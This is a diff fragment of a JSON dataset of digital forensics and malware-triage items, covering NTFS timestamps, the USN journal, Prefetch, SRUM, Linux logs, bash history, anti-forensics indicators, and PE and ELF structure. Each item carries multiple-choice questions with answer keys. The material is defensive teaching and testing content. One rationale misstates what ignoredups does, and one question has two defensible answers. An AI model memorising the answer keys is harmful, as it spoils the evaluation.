+      "fact": "Every NTFS file has a record in $MFT with two attribute sets carrying four timestamps each: $STANDARD_INFORMATION (0x10), which normal file APIs update, and $FILE_NAME (0x30), which is updated on rename and on parent-directory changes. Timestomping tools typically rewrite $STANDARD_INFORMATION and leave $FILE_NAME inconsistent, so a creation time later than the $FILE_NAME creation time, or sub-second values of exactly zero, is a strong indicator of manipulation. Conversely $FILE_NAME times can legitimately lag, so a mismatch is a lead to corroborate with $LOGFILE, $UsnJrnl and event logs rather than proof on its own.",
+      "details": [
+        "Resident files store content inside the MFT record; large files use $DATA runs pointing to clusters.",
+        "Alternate data streams appear as additional $DATA attributes and can survive simple copy operations in some tools.",
+        "$MFT records can also be carved from unallocated space, sometimes recovering deleted file metadata."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "icat -o 2048 /evidence/host-01.dd 0 > mft.bin",
+          "purpose": "Extract the $MFT record stream from an image with a 2048-sector offset."
+        },
+        {
+          "language": "bash",
+          "code": "analyzeMFT.py -f mft.bin -o mft.csv",
+          "purpose": "Parse the extracted MFT into CSV for timestamp comparison."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "An executable's $STANDARD_INFORMATION creation time is 2026-03-04, but its $FILE_NAME creation time is 2024-11-12. What is the best interpretation?",
+          "options": [
+            "The file was definitely created twice",
+            "A mismatch consistent with timestomping, to be corroborated with other artifacts before concluding",
+            "The disk has hardware failure",
+            "NTFS stores random values in $FILE_NAME"
+          ],
+          "answer": [1],
+          "rationale": "Tools that alter timestamps commonly change $STANDARD_INFORMATION only, leaving $FILE_NAME behind. The mismatch is a strong lead, but $FILE_NAME can also lag for legitimate reasons, so it must be corroborated with $UsnJrnl, $LogFile or event logs."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Eric Zimmerman's forensic tools documentation (MFTECmd)",
+          "publisher": "Eric Zimmerman",
+          "url": "https://ericzimmerman.github.io/",
+          "license": "MIT"
+        }
+      ],
+      "tags": ["ntfs", "mft", "timestomping", "windows-artifacts"]
+    },
+    {
+      "id": "forensics-usn-026",
+      "subtopic": "forensics-windows-usn",
+      "difficulty": "expert",
+      "title": "USN journal: change history that timestomping does not erase",
+      "fact": "The NTFS USN change journal ($Extend\\$UsnJrnl:$J) records file system changes with a monotonically increasing update sequence number, the file reference, reason flags such as FILE_CREATE, DATA_EXTEND, RENAME_OLD_NAME, RENAME_NEW_NAME and 0x80000000 for FILE_DELETE, and usually a timestamp. It is a rolling log bounded by maximum size, so older records are overwritten, and an administrator can delete it with fsutil, which is itself a notable anti-forensics action. Because some records carry unreliable timestamps, analysts map USN ranges to time using $MFT, $LogFile or event logs. Its main value is ordering: it shows what changed around an event even when MFT timestamps were altered.",
+      "details": [
+        "$UsnJrnl has two streams: $J holds the change records and $Max holds journal metadata such as maximum size and allocation delta.",
+        "Reason flags accumulate, so one record may list several changes for the same operation.",
+        "Journal deletion is inferred from the absence of expected records plus any command telemetry or event logs covering the deletion."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "fsutil usn readjournal C:",
+          "purpose": "Read the USN journal on a live Windows host without modifying it."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why is the USN journal useful when an attacker has timestomped files?",
+          "options": [
+            "It stores a copy of every file's content",
+            "It records an ordered sequence of file system changes with reason flags, independent of the timestamps an attacker edited",
+            "It encrypts file names so they cannot be changed",
+            "It replaces the need for a disk image"
+          ],
+          "answer": [1],
+          "rationale": "The journal records ordered change events with reasons and file references. Even where per-record timestamps are missing or unreliable, that ordering can be anchored to other artifacts and contradicts a fabricated file timeline."
+        }
+      ],
+      "references": [
+        {
+          "title": "fsutil usn",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["ntfs", "usn-journal", "anti-forensics", "ordering"]
+    },
+    {
+      "id": "forensics-prefetch-027",
+      "subtopic": "forensics-windows-prefetch",
+      "difficulty": "intermediate",
+      "title": "Prefetch: execution evidence with clear limits",
+      "fact": "Windows Prefetch files (.pf) in C:\\Windows\\Prefetch record an executable's name, run count, up to eight recent run times, referenced files and volumes, and are written by the Prefetch/SysMain component shortly after a program starts. They are valuable for showing that a binary ran, where it ran from and what it loaded, but absence proves little: execution can finish before the trace is written, the service may be disabled, cleanup tools delete the files, and Windows Server disables prefetch by default. Windows 10 and 11 retain up to about 1024 entries, so older entries are evicted on busy systems.",
+      "details": [
+        "Prefetch files on Windows 8 and later can be parsed with tools such as PECmd, which handle the compressed format.",
+        "A prefetch entry for a binary in a temp path with a run count of one and a volume serial matching a USB device is a strong lead.",
+        "Prefetch does not record command-line arguments; pair it with process creation events for those."
+      ],
+      "commands": [
+        {
+          "language": "powershell",
+          "code": "Get-ChildItem C:\\Windows\\Prefetch\\*.pf | Sort-Object LastWriteTime -Descending | Select-Object -First 20 Name,LastWriteTime",
+          "purpose": "List the most recently written prefetch files on a live host."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "A host has no prefetch entry for a binary that event logs show was executed. What is the most reasonable conclusion?",
+          "options": [
+            "The event log entry must be forged",
+            "Prefetch absence is inconclusive: the service may be disabled, the entry evicted, or the write not completed",
+            "The binary never executed",
+            "The binary was deleted before execution"
+          ],
+          "answer": [1],
+          "rationale": "Prefetch is best-effort telemetry with a bounded store, and it is disabled by default on Windows Server. Absence cannot refute execution evidence from other sources; it only means this artifact does not record it."
+        }
+      ],
+      "references": [
+        {
+          "title": "Eric Zimmerman's forensic tools documentation (PECmd)",
+          "publisher": "Eric Zimmerman",
+          "url": "https://ericzimmerman.github.io/",
+          "license": "MIT"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["prefetch", "execution-evidence", "windows-artifacts"]
+    },
+    {
+      "id": "forensics-amcache-028",
+      "subtopic": "forensics-windows-amcache",
+      "difficulty": "advanced",
+      "title": "Amcache and ShimCache answer different questions",
+      "fact": "Amcache.hve in C:\\Windows\\AppCompat\\Programs\\Amcache.hve is a registry hive recording application inventory: paths, first-seen and link timestamps, publisher and version from version resources, and for many executables a SHA-1 file identifier, with entries persisting after the file is deleted. ShimCache, the AppCompatCache value under HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager, records compatibility-shim observations and is best treated as evidence of presence, not execution; some Windows 10 builds add a last-modified time that can support an execution argument, but semantics vary by build. Neither is a reliable last-executed record, and neither replaces prefetch or event logs, but together they survive file deletion and are strong leads about what existed on a host.",
+      "details": [
+        "Amcache's FileId is a SHA-1 of file content for many entries, allowing hash-based pivoting without the file itself.",
+        "Parsing Amcache requires the hive plus knowledge of the Windows build, because value names and structure changed across versions.",
+        "ShimCache entries are not stored in chronological order and should not be used to rank execution."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "reg save HKLM\\SYSTEM /evidence/SYSTEM.hiv",
+          "purpose": "Export the SYSTEM hive, which contains ShimCache, for offline analysis."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which statement about ShimCache is most accurate?",
+          "options": [
+            "It records an ordered list of every program executed with timestamps",
+            "It primarily evidences that a file existed or was examined, and its execution semantics vary by Windows build",
+            "It stores copies of executable content for later analysis",
+            "It is deleted whenever a file is deleted"
+          ],
+          "answer": [1],
+          "rationale": "ShimCache is a compatibility-shim artifact. It evidences presence or examination of a binary, and only some builds include a last-modified time that can support an execution inference. It is unordered, holds no content copy, and does not guarantee execution."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Eric Zimmerman's forensic tools documentation (AppCompatCacheParser, AmcacheParser)",
+          "publisher": "Eric Zimmerman",
+          "url": "https://ericzimmerman.github.io/",
+          "license": "MIT"
+        }
+      ],
+      "tags": ["amcache", "shimcache", "windows-artifacts", "execution-evidence"]
+    },
+    {
+      "id": "forensics-srum-029",
+      "subtopic": "forensics-windows-srum",
+      "difficulty": "advanced",
+      "title": "SRUM records per-application network and resource usage",
+      "fact": "The System Resource Usage Monitor stores data in C:\\Windows\\System32\\sru\\SRUDB.dat, an Extensible Storage Engine database, with hourly records per application: bytes sent and received, interface, user SID, and CPU or energy counters depending on version. For exfiltration questions it can show which process moved volume and under which account, even after the process has exited, and it can corroborate a cloud-sync or backup tool as the data path. Records are pruned on a rolling basis, roughly 30 to 60 days on Windows 10 and 11 depending on activity, so it complements rather than replaces proxy and firewall logs. Parsing requires the ESE database plus the SOFTWARE hive to resolve SIDs and application names.",
+      "details": [
+        "Volume alone is not exfiltration: backups, updates and video calls move large amounts of data legitimately.",
+        "Correlate SRUM bytes with destination logs to establish where the data went, not just how much.",
+        "The database is locked on a running system; collect it with the hives and a volume image, or from an image."
+      ],
+      "mcqs": [
+        {
+          "question": "What question is SRUM best suited to answer?",
+          "options": [
+            "Which user typed a specific command",
+            "Which application sent or received a given volume of network data in a time window and under which account",
+            "What the contents of a deleted file were",
+            "Which TLS cipher suite was negotiated"
+          ],
+          "answer": [1],
+          "rationale": "SRUM aggregates per-application resource and network usage per hour, attributed to a user SID. It shows volume and application, not command lines, file contents or cipher details, so it is used to corroborate exfiltration volume and timing."
+        }
+      ],
+      "references": [
+        {
+          "title": "srum-dump",
+          "publisher": "Mark Baggett",
+          "url": "https://github.com/MarkBaggett/srum-dump",
+          "license": "MIT"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["srum", "exfiltration", "windows-artifacts", "ese"]
+    },
+    {
+      "id": "forensics-linux-030",
+      "subtopic": "forensics-linux-logs",
+      "difficulty": "foundational",
+      "title": "Linux: journald, auditd and login records",
+      "fact": "systemd-journald writes structured binary journals; with Storage=auto and a /var/log/journal directory present it persists them, otherwise logs live in /run/log/journal and vanish on reboot, so a host without persistent storage loses its own history. journalctl filters by unit, boot, priority and time, and the journal typically includes the process, PID, unit and a monotonic timestamp useful for ordering. auditd records syscall and policy events to /var/log/audit/audit.log under rules in /etc/audit/rules.d, which makes it the better source for file access, privilege changes and execve arguments when the rules cover them; ausearch and aureport query it. Login history lives in wtmp, btmp and lastlog, which are binary and rotated.",
+      "details": [
+        "auditd captures execve arguments only if the rule includes them, and default rule sets vary by distribution.",
+        "journald can forward to a remote collector, which preserves events if the host is wiped.",
+        "A stopped auditd service or a permissive journald configuration is itself an indicator worth investigating."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "journalctl --since '2026-03-01 00:00:00' --until '2026-03-02 00:00:00' -u ssh -o short-precise",
+          "purpose": "Query persistent journal entries for a unit within a precise UTC window."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "A Linux host's journal contains only entries since its last boot. What is the most likely explanation?",
+          "options": [
+            "The journal was encrypted",
+            "Journal storage is volatile because /var/log/journal does not exist, so records live under /run and are lost on reboot",
+            "auditd was disabled",
+            "The kernel does not support logging"
+          ],
+          "answer": [1],
+          "rationale": "With Storage=auto, journald persists only when the persistent journal directory exists; otherwise it writes to the volatile runtime path and the history disappears at reboot. That is a configuration gap, not encryption or a kernel limitation."
+        }
+      ],
+      "references": [
+        {
+          "title": "systemd-journald.service manual",
+          "publisher": "systemd project",
+          "url": "https://www.freedesktop.org/software/systemd/man/latest/systemd-journald.service.html",
+          "license": "LGPL-2.1-or-later"
+        },
+        {
+          "title": "auditd(8) manual page",
+          "publisher": "Linux man-pages project",
+          "url": "https://man7.org/linux/man-pages/man8/auditd.8.html",
+          "license": "Linux-man-pages-copyleft"
+        }
+      ],
+      "tags": ["linux", "journald", "auditd", "logs"]
+    },
+    {
+      "id": "forensics-bash-031",
+      "subtopic": "forensics-shell-history",
+      "difficulty": "foundational",
+      "title": "Bash history: useful, incomplete and easy to lose",
+      "fact": "Shell history is a convenience log, not an audit trail: it is written when the shell exits, so a killed session may leave nothing, and HISTFILE can be unset, redirected to /dev/null or pointed elsewhere. HISTCONTROL=ignorespace drops commands prefixed with a space and ignoredups collapses repeats; HISTIGNORE filters patterns; HISTSIZE caps the in-memory list; and timestamps appear only if HISTTIMEFORMAT was set when the commands were entered. Running history -c clears the in-memory list and, depending on histappend, may or may not truncate the file on exit, so the file itself must be checked. Other shells behave differently, since zsh's extended history stores timestamps and durations, and non-interactive execution records nothing at all, which is why process accounting and auditd matter.",
+      "details": [
+        "Commands run by scripts, cron jobs and service managers generally never reach bash history.",
+        "Check per-user files, root's file, and any HISTFILE override in shell profiles.",
+        "Deleted history can sometimes be recovered from disk slack or backups, but not reliably."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "HISTTIMEFORMAT='%F %T ' history 50",
+          "purpose": "Display the most recent commands with timestamps where the shell recorded them."
+        },
+        {
+          "language": "bash",
+          "code": "grep -c '' ~/.bash_history",
+          "purpose": "Count stored history entries in a user's history file."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which command is least likely to appear in bash history?",
+          "options": [
+            "An interactive command typed at a prompt",
+            "A command run by a cron job's non-interactive shell",
+            "A command preceded by a space with HISTCONTROL=ignorespace",
+            "A command entered before the shell exits normally"
+          ],
+          "answer": [1],
+          "rationale": "Non-interactive shells generally do not write history at all, so scripted and scheduled execution leaves no history record. Space-prefixed commands are also dropped when ignoredups or ignorespace is set, and normal interactive commands are recorded at exit."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "If a command is not in .bash_history, it was never run.",
+          "correction": "History is written at shell exit, can be disabled or redirected, drops space-prefixed and duplicate commands depending on configuration, is truncated by HISTSIZE, and never captures non-interactive execution. Absence is not evidence of non-execution; auditd, process accounting and application logs cover those gaps."
+        }
+      ],
+      "references": [
+        {
+          "title": "Bash Reference Manual: Bash History Facilities",
+          "publisher": "GNU Project",
+          "url": "https://www.gnu.org/software/bash/manual/bash.html",
+          "license": "GPL-3.0-or-later"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["linux", "bash-history", "shell", "artifacts"]
+    },
+    {
+      "id": "forensics-antiforensics-032",
+      "subtopic": "forensics-anti-forensics",
+      "difficulty": "advanced",
+      "title": "Anti-forensics indicators worth hunting",
+      "fact": "Anti-forensic activity is often easier to detect than the activity it hides, because the cleanup is itself logged somewhere. High-value indicators include Security event 1102 (audit log cleared) and System event 104, a USN journal deleted or disabled, the event log service stopped or its size reduced, auditd stopped or its rules flushed, prefetch and Amcache entries missing for binaries that clearly ran, timestamps inconsistent between $STANDARD_INFORMATION and $FILE_NAME, secure-deletion or free-space wiping tools, shell history replaced by a symlink to /dev/null, and Sysmon or EDR agents uninstalled or silenced. Absence of evidence must be corroborated: a log gap can equally come from a retention policy, a full disk or a failed agent.",
+      "details": [
+        "Centralised logging is the main defence, because an attacker must then tamper in two places.",
+        "Tamper protection and signed agent configurations raise the cost of disabling telemetry.",
+        "Correlate with authentication events, since cleanup usually requires privileged access."
+      ],
+      "logs": [
+        {
+          "context": "Windows Security and System logs after suspected cleanup",
+          "text": "Security 2026-03-04T03:11:20Z EventID 1102 The audit log was cleared. Subject: EXAMPLE\\svc-maint\nSystem   2026-03-04T03:12:02Z EventID 7045 A service was installed: name=\"WinDefendHelper\" path=\"C:\\ProgramData\\tmp\\wdsvc.exe\"\nlinux-01 2026-03-04T03:15:44Z auditd: stopping audit daemon",
+          "reading": "Log clearing at 03:11, a new service two minutes later and auditd stopped on another host within the same window indicate coordinated defense evasion. Note the clearing account and check whether it was legitimately used, then look for what happened just before the clear in forwarded logs."
+        }
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "ausearch -m CONFIG_CHANGE -ts recent",
+          "purpose": "Look for recent audit subsystem configuration changes on a Linux host."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Event ID 1102 appears in the Security log of a server. What does it record?",
+          "options": [
+            "A user logged on with explicit credentials",
+            "The audit log was cleared",
+            "A new service was installed",
+            "A scheduled task was registered"
+          ],
+          "answer": [1],
+          "rationale": "Security event 1102 records that the audit log was cleared, which is both an anti-forensics indicator and a warning that earlier Security events may be gone. Service installation is 7045 in the System log, and logon events are 4624 and 4648."
+        }
+      ],
+      "references": [
+        {
+          "title": "Event 1102: The audit log was cleared",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-1102",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["anti-forensics", "log-clearing", "timestomping", "tamper"]
+    },
+    {
+      "id": "forensics-soundness-033",
+      "subtopic": "forensics-soundness",
+      "difficulty": "intermediate",
+      "title": "Forensic soundness is a method claim, not a feeling",
+      "fact": "Forensic soundness means the process is documented, repeatable and minimally invasive, with validated tools and preserved originals, so an independent examiner could reproduce the findings. ISO/IEC 27037 describes identification, collection, acquisition and preservation of digital evidence; the NIST Computer Forensics Tool Testing programme publishes test reports and methodologies for imaging tools and write blockers; peer review and recorded tool versions close the loop. Soundness is not the same as admissibility: admissibility is decided by a court under its own rules, such as the Daubert factors in US federal courts, and a technically sound examination can still be excluded for procedural reasons such as an unrecorded break in custody.",
+      "details": [
+        "Keep contemporaneous notes with enough detail for someone else to repeat each step.",
+        "Record known limitations, failed reads and tool errors rather than presenting a clean narrative.",
+        "Validate that a write blocker actually blocks writes in the configuration used, not merely that one was purchased."
+      ],
+      "mcqs": [
+        {
+          "question": "Which pair of concepts is correctly distinguished?",
+          "options": [
+            "Soundness and admissibility are the same thing",
+            "Soundness concerns documented, repeatable and minimally invasive method; admissibility is a legal determination by a court",
+            "Admissibility is decided by the forensic tool vendor",
+            "Soundness only applies to criminal cases"
+          ],
+          "answer": [1],
+          "rationale": "Soundness is a methodological property that supports reliability, while admissibility depends on legal rules and the judge's assessment. A sound examination can be excluded on procedural grounds, and an unsound one is vulnerable to challenge even in a civil or internal process."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "A matching hash proves the evidence is authentic and the findings are correct.",
+          "correction": "A hash proves integrity from the point of hashing. Authenticity also depends on lawful and documented collection, and the correctness of findings depends on validated tools, sound interpretation and review. Integrity is necessary but not sufficient."
+        }
+      ],
+      "references": [
+        {
+          "title": "ISO/IEC 27037:2012 Guidelines for identification, collection, acquisition and preservation of digital evidence",
+          "publisher": "ISO/IEC",
+          "url": "https://www.iso.org/standard/44381.html",
+          "license": "ISO copyright (paid standard)"
+        },
+        {
+          "title": "Computer Forensics Tool Testing Program (CFTT)",
+          "publisher": "NIST",
+          "url": "https://www.nist.gov/itl/ssd/software-quality-group/computer-forensics-tool-testing-program-cftt",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/86/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["soundness", "tool-validation", "iso27037", "admissibility"]
+    },
+    {
+      "id": "forensics-cloudlogs-034",
+      "subtopic": "forensics-browser-cloud-logs",
+      "difficulty": "foundational",
+      "title": "Browser and SaaS logs: short retention, high value",
+      "fact": "Browser forensics reads SQLite databases such as Chrome and Edge History, Downloads, Cookies and Login Data, and Firefox places.sqlite and cookies.sqlite, plus cache and session files, which can show what a user visited, downloaded or uploaded and when, subject to sync and private-browsing gaps. Cloud and SaaS sources are equally important and expire quickly: Entra ID sign-in logs are typically retained for about 30 days, AWS CloudTrail's console event history covers 90 days of management events, and Microsoft 365 unified audit log retention is measured in months and varies by licence. Export to a SIEM or case store early, because once the retention window closes the evidence is gone regardless of any legal hold.",
+      "details": [
+        "Browser timestamps are often microseconds since 1601 (WebKit) or Unix epoch; convert carefully and confirm against a known event.",
+        "Chrome's History database is locked while the browser runs, so copy it before opening.",
+        "Cloud audit logs record the API caller identity, source address and user agent, which often distinguishes console use from automated access."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "sqlite3 History \"select datetime(last_visit_time/1000000-11644473600,'unixepoch'),url from urls order by last_visit_time desc limit 20;\"",
+          "purpose": "List recent Chrome or Edge history entries with converted timestamps from a copied profile database."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why must cloud audit logs be exported rather than relied on in place?",
+          "options": [
+            "They are encrypted and cannot be read by customers",
+            "Provider retention windows are short and expire independently of any legal hold you issue",
+            "They only record failed requests",
+            "They are deleted whenever a user changes their password"
+          ],
+          "answer": [1],
+          "rationale": "Retention is set by the provider and licence, typically 30 days for Entra sign-in logs and about 90 days for CloudTrail console history. A legal hold on your side cannot extend the provider's window, so forward the logs to storage you control."
+        }
+      ],
+      "references": [
+        {
+          "title": "Microsoft Entra ID sign-in logs",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "Audit log retention policies",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/purview/audit-log-retention-policies",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "AWS CloudTrail concepts",
+          "publisher": "Amazon Web Services",
+          "url": "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-concepts.html",
+          "license": "CC-BY-SA-4.0"
+        }
+      ],
+      "tags": ["browser", "saas", "retention", "cloud-logs"]
+    },
+    {
+      "id": "mal-analysis-035",
+      "subtopic": "malware-analysis-methods",
+      "difficulty": "foundational",
+      "title": "Static and dynamic analysis answer different questions",
+      "fact": "Static analysis examines a sample without running it: hashes, file type, strings, PE or ELF headers, imports, resources, signatures and YARA matches. It is safe, fast and repeatable, but packing, encryption and obfuscation defeat it. Dynamic analysis runs the sample in an instrumented, isolated environment and observes process, file, registry, network and memory behaviour, revealing intent that static inspection cannot, at the cost of time and of the sample detecting the environment. Practitioners loop between the two: static findings suggest what to watch for dynamically, and dynamic findings tell the analyst where to look in the code. Triage always starts with hashing and reputation lookup so known-good or already-characterised files are not re-analysed.",
+      "details": [
+        "Record the SHA-256, file size, type and first-seen time before any other action.",
+        "YARA rules match structural and string patterns and are useful for family classification and hunting across stores.",
+        "Never open a sample on a production workstation, and treat documents with macros or exploits as live until proven otherwise."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "sha256sum sample.bin; file sample.bin; strings -n 8 sample.bin | head -40",
+          "purpose": "Fingerprint a sample and extract readable strings for a first-pass assessment."
+        },
+        {
+          "language": "bash",
+          "code": "yara -r rules/family_index.yar sample.bin",
+          "purpose": "Match a sample against a directory of local YARA rules."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "What is the main limitation of static analysis alone?",
+          "options": [
+            "It is slower than running the sample",
+            "It requires internet access for every sample",
+            "Packing, encryption and obfuscation can hide imports, strings and behaviour from inspection",
+            "It can only be performed on Linux"
+          ],
+          "answer": [2],
+          "rationale": "Static inspection reads what is present in the file. Packers and crypters compress or encrypt the real code and rebuild imports at runtime, so the meaningful content may not exist in a readable form until execution."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-83 Rev. 1: Guide to Malware Incident Prevention and Handling for Desktops and Laptops",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/83/r1/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "YARA documentation",
+          "publisher": "VirusTotal",
+          "url": "https://yara.readthedocs.io/",
+          "license": "BSD-3-Clause"
+        }
+      ],
+      "tags": ["malware", "static-analysis", "dynamic-analysis", "yara"]
+    },
+    {
+      "id": "mal-pe-036",
+      "subtopic": "malware-pe-structure",
+      "difficulty": "intermediate",
+      "title": "Reading a PE file's structure for triage",
+      "fact": "A Windows PE file starts with the MZ DOS header, whose e_lfanew field points to the PE signature, followed by the COFF file header (machine, section count, timestamp, characteristics) and the optional header (entry point, image base, subsystem, DLL characteristics such as ASLR, DEP and CFG, and data directories for imports, exports, resources and the certificate table). Section headers map names such as .text, .rdata, .data and .rsrc to virtual addresses, raw offsets and permissions; a section that is both writable and executable, or whose raw size is far smaller than its virtual size, suggests self-modifying or unpacking code. Imports reveal capability such as crypto, networking and process-injection APIs, exports reveal DLL purpose, TLS callbacks execute before the entry point, and an absent or invalid Authenticode signature is a lead rather than proof of malice.",
+      "details": [
+        "The compile timestamp in the COFF header is trivially forged and should be treated as a hint only.",
+        "Check the resource directory for embedded executables and the overlay for appended data.",
+        "Rich header and PDB path strings sometimes leak build tooling and development paths."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "python3 -c \"import pefile,sys; pe=pefile.PE(sys.argv[1]); print(hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)); [print(s.Name, hex(s.Characteristics)) for s in pe.sections]\" sample.exe",
+          "purpose": "Print the entry point and section characteristics of a PE file with pefile."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "A PE section has raw size 512 bytes but virtual size 96 KB, and its characteristics mark it writable and executable. What does this most suggest?",
+          "options": [
+            "The file is definitely benign because it is small",
+            "A likely unpacking stub that expands code into memory at runtime",
+            "The file is a text document with an unusual extension",
+            "The signature is valid"
+          ],
+          "answer": [1],
+          "rationale": "A large virtual-to-raw size ratio plus write-and-execute permissions is a classic packer pattern: the stub is tiny on disk and allocates a much larger executable region at runtime. It is a lead requiring behavioural confirmation, not proof of malice."
+        }
+      ],
+      "references": [
+        {
+          "title": "PE Format",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/windows/win32/debug/pe-format",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "NIST SP 800-83 Rev. 1: Guide to Malware Incident Prevention and Handling for Desktops and Laptops",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/83/r1/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["pe", "file-format", "imports", "sections"]
+    },
+    {
+      "id": "mal-elf-037",
+      "subtopic": "malware-elf-structure",
+      "difficulty": "intermediate",
+      "title": "Reading an ELF binary's structure for triage",
+      "fact": "An ELF file begins with 0x7f 'E' 'L' 'F', a class byte (32 or 64 bit), an endianness byte and a type: ET_EXEC for a fixed-address executable, ET_DYN for a position-independent executable or shared object, and ET_REL for a relocatable object. Program headers describe loadable segments (PT_LOAD), the interpreter (PT_INTERP) and dynamic linking (PT_DYNAMIC); section headers name .text, .data, .rodata, .init_array and .fini_array, where init-array functions run before main. Imports appear as undefined dynamic symbols and in the PLT and GOT, a stripped binary keeps dynamic symbols but loses local names, and static linking hides library dependencies entirely. Linux malware frequently ships as a stripped ET_DYN with an unusual interpreter path or as a script wrapper that drops and runs a payload.",
+      "details": [
+        "Use objdump -p to list needed libraries rather than ldd on an untrusted binary, because some loader implementations can execute code when resolving dependencies.",
+        "Check for an unusual PT_INTERP path, which can indicate a custom loader.",
+        "High-entropy sections and a very small set of imports are packer indicators on ELF as on PE."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "readelf -h -l -S sample.elf",
+          "purpose": "Inspect ELF header, program headers and section headers of a sample."
+        },
+        {
+          "language": "bash",
+          "code": "objdump -p sample.elf | grep NEEDED",
+          "purpose": "List shared-library dependencies without invoking the dynamic loader."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "What does an ELF e_type of ET_DYN indicate?",
+          "options": [
+            "A relocatable object file that cannot be executed",
+            "A position-independent executable or shared object",
+            "A core dump",
+            "A 32-bit binary"
+          ],
+          "answer": [1],
+          "rationale": "ET_DYN means the object is position independent and can be loaded at a chosen base address, which covers shared libraries and PIE executables. Relocatable objects are ET_REL, core dumps are ET_CORE, and bit width is recorded separately in the class byte."
+        }
+      ],
+      "references": [
+        {
+          "title": "elf(5) manual page",
+          "publisher": "Linux man-pages project",
+          "url": "https://man7.org/linux/man-pages/man5/elf.5.html",
+          "license": "Linux-man-pages-copyleft"
+        },
+        {
+          "title": "NIST SP 800-83 Rev. 1: Guide to Malware Incident Prevention and Handling for Desktops and Laptops",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/83/r1/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["elf", "file-format", "linux-malware", "symbols"]
+    },
+    {
+      "id": "mal-packer-038",
+      "subtopic": "malware-packing",
+      "difficulty": "foundational",
+      "title": "Packer and obfuscation indicators",
